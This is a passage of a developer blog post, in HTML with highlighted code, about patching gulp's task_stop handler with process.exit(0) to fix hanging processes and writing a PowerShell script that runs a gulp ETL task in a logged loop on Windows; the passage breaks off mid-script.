<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gulp some_db_task</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<p>Unfortunately, option 3 was too cumbersome as it required installing NPM/NodeJS on the master node since the product does not install it by default (it just uses the <code>node.exe</code> binary). And since the customer requested a specific DB to run this pipeline on, I decided to discard option 1 and develop a script to run option 2.</p>
<p>As I began testing the procedure, I noticed that the gulp tasks created a forked process by which they would interact with the .NET management service. The problem was, once the command to initialize the ETL process finished executing, the process would hang and would not complete the remote copying operations. I needed to figure out what was causing this hang so I opened my IDE to review the source code behind gulp.
What I found was that after the gulp task stopped its execution, it did not gracefully terminate the process. It can be seen here:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gulpInst</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">on</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'task_stop'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">prettyTime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hrDuration</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gutil</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">'Finished'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\''</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> chalk</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">cyan</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">task</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\''</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">'after'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> chalk</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">magenta</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I added the following line to ensure that the process exited when the task stopped:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gulpInst</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">on</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'task_stop'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">prettyTime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hrDuration</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gutil</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">'Finished'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\''</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> chalk</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">cyan</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">task</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'\''</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">'after'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> chalk</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">magenta</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// &lt;-------- SHOULD BE HERE!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After updating the source code, the hanging processes issue was resolved!
Next step was to write a script to run the sequential build.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="gulp-powered-by-powershell"><code>gulp</code> Powered by PowerShell<a href="https://kbbgl.github.io/blog/gulpjs-task-using-powershell#gulp-powered-by-powershell" class="hash-link" aria-label="Direct link to gulp-powered-by-powershell" title="Direct link to gulp-powered-by-powershell">​</a></h2>
<p>My scripting language of choice is bash but since I was working on a Windows environment, without an ability to install 3rd-party tools such as <code>cygwin</code> and no access to Python either, I defaulted to PowerShell. The script name is <code>gulpTaskSequentialWithWait.ps1</code>:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#  -------------------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#  -------------------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#  User configuration </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Configurate number of minutes to wait before each ETL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$waitTimeBetweenBuildsInMinutes</span><span class="token plain"> = 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># The gulp task name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$taskName</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">"some_db_task"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># log location -default writes to directory where ps script was launched from</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$currentLocation</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$PSScriptRoot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">Join-Path</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path </span><span class="token variable" style="color:#36acaa">$currentLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ChildPath </span><span class="token string" style="color:#e3116c">"gulpTaskSequential.log"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Writing logs to '</span><span class="token string variable" style="color:#36acaa">$logLocation</span><span class="token string" style="color:#e3116c">'"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#  -------------------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#  -------------------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$workingDir</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">"C:\path\to\dir"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$env</span><span class="token plain">:NODE_ENV = </span><span class="token string" style="color:#e3116c">'production'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$gulpFile</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">"./node_modules/gulp/bin/gulp.js"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$nodeJsExecutableFilePath</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">"node.exe"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Start gulp task infintely</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Create a new process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">New-Object</span><span class="token plain"> System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Diagnostics</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ProcessStartInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Set working dir to Orchestrator folder</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">WorkingDirectory = </span><span class="token variable" style="color:#36acaa">$workingDir</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Changed working dir:"</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">WorkingDirectory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Initialize process arguments and output redirection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">FileName = </span><span class="token function" style="color:#d73a49">Join-Path</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path </span><span class="token variable" style="color:#36acaa">$workingDir</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ChildPath </span><span class="token variable" style="color:#36acaa">$nodeJsExecutableFilePath</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">RedirectStandardError = </span><span class="token boolean" style="color:#36acaa">$true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">RedirectStandardOutput = </span><span class="token boolean" style="color:#36acaa">$true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">UseShellExecute = </span><span class="token boolean" style="color:#36acaa">$false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">CreateNoWindow = </span><span class="token boolean" style="color:#36acaa">$true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Arguments = @</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$gulpFile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$taskName</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$p</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">New-Object</span><span class="token plain"> System</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Diagnostics</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">Process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">StartInfo = </span><span class="token variable" style="color:#36acaa">$pinfo</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Start</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-Null</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Starting task '</span><span class="token string variable" style="color:#36acaa">$nodeJsExecutableFilePath</span><span class="token string" style="color:#e3116c"> </span><span class="token string variable" style="color:#36acaa">$gulpFile</span><span class="token string" style="color:#e3116c"> </span><span class="token string variable" style="color:#36acaa">$taskName</span><span class="token string" style="color:#e3116c">'..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Starting task '</span><span class="token string variable" style="color:#36acaa">$nodeJsExecutableFilePath</span><span class="token string" style="color:#e3116c"> </span><span class="token string variable" style="color:#36acaa">$gulpFile</span><span class="token string" style="color:#e3116c"> </span><span class="token string variable" style="color:#36acaa">$taskName</span><span class="token string" style="color:#e3116c">'..."</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$stdout</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">StandardOutput</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ReadToEnd</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$stderr</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">StandardError</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ReadToEnd</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">WaitForExit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Terminate process if non-zero exit code returned from command</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ExitCode </span><span class="token operator" style="color:#393A34">-ne</span><span class="token plain"> 0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">" exit code: "</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ExitCode </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"exit code: "</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ExitCode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">" stderr: </span><span class="token string variable" style="color:#36acaa">$stderr</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"stderr: </span><span class="token string variable" style="color:#36acaa">$stderr</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Exiting.."</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Exiting.."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" stdout: </span><span class="token string variable" style="color:#36acaa">$stdout</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Out-File</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">FilePath </span><span class="token variable" style="color:#36acaa">$logLocation</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Append</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">Write-Host</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Get-Date</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Format U</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"stdout: </span><span class="token string variable" style="color:#36acaa">$stdout</span><span class="token string" 